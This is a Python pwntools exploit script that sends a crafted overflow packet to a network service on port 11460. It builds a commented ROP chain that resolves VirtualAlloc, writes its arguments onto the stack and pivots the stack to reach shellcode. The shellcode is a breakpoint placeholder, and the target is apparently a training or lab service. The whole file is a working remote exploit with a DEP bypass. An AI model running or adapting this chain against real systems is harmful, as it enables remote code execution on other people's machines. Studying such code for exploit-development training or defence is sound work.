from pwn import *
from pwn import p32
import sys
from struct import pack


host = sys.argv[1]
port = 11460

opcode = p32(0x534)

offset_1 = p32(0x00)
size_1 = p32(0x500)

offset_2 = p32(0x00)
size_2 = p32(0x100)

offset_3 = pack("<i", 0x00)
size_3 = p32(0x100)


buf1 = b"\x45"*0xc + opcode + offset_1 + size_1 + offset_2 + size_2 + offset_3 + size_3 + b"A"*8


# Save esp to esi
eip = p32(0x50501110) # push esp ; push eax ; pop edi ; pop esi ; ret ;

# Move stack back by manipulating esi through eax to point to Virtual Alloc address
rop1 = p32(0x505153de) # mov eax, esi ; pop esi ; ret ;
rop2 = p32(0x505115a3) # pop ecx ; ret ;
value1 = p32(0xffffffe4) # -0x1c
rop3 = p32(0x5051579a) # add eax, ecx ; ret ;
rop4 = p32(0x50537d5b) # push eax ; pop esi ; ret ;

# Set up Virtual Alloc Address
rop5 = p32(0x5053a0f5) # pop eax ; ret ;
virtualAlloc_addr = p32(0x5054A221)
rop6 = p32(0x505115a3) # pop ecx ; ret ;
value2 = p32(0xffffffff) # -1
rop7 = p32(0x5051579a) # add eax, ecx ; ret ;
rop8 = p32(0x5051f278) # mov eax,  [eax] ; ret ; # Save value of the actual address saved in IAT
rop9 = p32(0x5051cbb6) # mov  [esi], eax ; ret ; # Save the value in esi address

# Move the esi address (stack) down 4 bytes
rop10 = rop11 = rop12 = rop13 = p32(0x50522fa7) # inc esi ; add al, 0x2B ; ret ; *4


rop14 = p32(0x505153de) # mov eax, esi ; pop esi ; ret ;
rop15 = p32(0x5052f773) # push eax ; pop esi ; ret ;
rop16 = p32(0x505115a3) # pop ecx ; ret ;
value4 = p32(0xfffffdf0) # -210
rop17 = p32(0x50533bea) # sub eax, ecx ; ret ;
rop18 = p32(0x5051cbb6) # mov  [esi], eax ; ret ;

rop19 = rop20 = rop21 = rop22 = p32(0x50522fa7) # inc esi ; add al, 0x2B ; ret ; *4
rop23 = p32(0x505153de) # mov eax, esi ; pop esi ; ret ;
rop24 = p32(0x5052f773) # push eax ; pop esi ; ret ;
rop25 = p32(0x505115a3) # pop ecx ; ret ;
value5 = p32(0xfffffdf4) # -20c
rop26 = p32(0x50533bea) # sub eax, ecx ; ret ;
rop27 = p32(0x5051cbb6) # mov  [esi], eax ; ret ;

rop28 = rop29 = rop30 = rop31 = p32(0x50522fa7) # inc esi ; add al, 0x2B ; ret ; *4
rop32 = p32(0x50503821) # xor eax, eax ; ret ;
rop33 = p32(0x505115a3) # pop ecx ; ret ;
value6 = p32(0xffffffff) # -1
rop34 = p32(0x50533bea) # sub eax, ecx ; ret ;
rop35 = p32(0x5051cbb6) # mov  [esi], eax ; ret ;

rop36 = rop37 = rop38 = rop39 = p32(0x50522fa7) # inc esi ; add al, 0x2B ; ret ; *4
rop40 = p32(0x50503821) # xor eax, eax ; ret ;
rop41 = p32(0x505115a3) # pop ecx ; ret ;
value7 = p32(0xffffefff) # -1001
rop42 = p32(0x505311c7) # inc ecx ; ret ;
rop43 = p32(0x50533bea) # sub eax, ecx ; ret ;
rop44 = p32(0x5051cbb6) # mov  [esi], eax ; ret ;


rop45 = rop46 = rop47 = rop48 = p32(0x50522fa7) # inc esi ; add al, 0x2B ; ret ; *4
rop49 = p32(0x50503821) # xor eax, eax ; ret ;
rop50 = p32(0x505115a3) # pop ecx ; ret ;
value8 = p32(0xffffffc0) # -0x40
rop51 = p32(0x50533bea) # sub eax, ecx ; ret ;
rop52 = p32(0x5051cbb6) # mov  [esi], eax ; ret ;

rop53 = p32(0x505153de) # mov eax, esi ; pop esi ; ret ;
rop54 = p32(0x505115a3) # pop ecx ; ret ;
value9 = p32(0xffffffe8) # -0x18
rop55 = p32(0x5051579a) # add eax, ecx ; ret ;
rop56 = p32(0x5051571f) # xchg eax, ebp ; ret ;
rop57 = p32(0x50533cbf) # mov esp, ebp ; pop ebp ; ret ;



ROP_final = rop1 + b"AAAA" + rop2 + value1 + rop3 + rop4 + rop5 + virtualAlloc_addr + rop6 + value2 + rop7 + rop8 + rop9 + rop10 + rop11 + rop12 + rop13 + rop14 + b"AAAA" + rop15 + rop16 + value4 + rop17 + rop18 + rop19 + rop20 + rop21 + rop22 + rop23 + b"AAAA" + rop24 + rop25 + value5 + rop26 + rop27 + rop28 + rop29 + rop30 + rop31 + rop32 + rop33 + value6 + rop34 + rop35 + rop36 + rop37 + rop38 + rop39 + rop40 + rop41 + value7 + rop42 + rop43 + rop44 + rop45 + rop46 + rop47 + rop48 + rop49 + rop50 + value8 + rop51 + rop52 + rop53 + b"AAAA" + rop54 + value9 + rop55 + rop56 + rop57

shellcode = b"\xcc"*0x100


chunk2 = ROP_final +b"\x90"*224 + shellcode 

virtualAlloc_addr = p32(0x5054A221)
shellcode_addr = b"\x46\x46\x46\x46"    # "AAAA"
param1 = b"\x47\x47\x47\x47"            # "BBBB"
param2 = b"\x48\x48\x48\x48"            # "CCCC"
param3 = b"\x49\x49\x49\x49"            # "DDDD"
param4 = b"\x50\x50\x50\x50"            # "EEEE"

stackSetup = virtualAlloc_addr + shellcode_addr + param1 + param2 + param3 + param4

chunk = b"\x90"*(0x114-len(stackSetup))


file = chunk + stackSetup + eip + chunk2
buf2 = b"File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d" % (file,0,0,0,0)

header = p32(len(buf1 + buf2))[::-1]

inpBuffer = header + buf1 + buf2    

r = remote(host, port)
r.send(inpBuffer)
r.close()
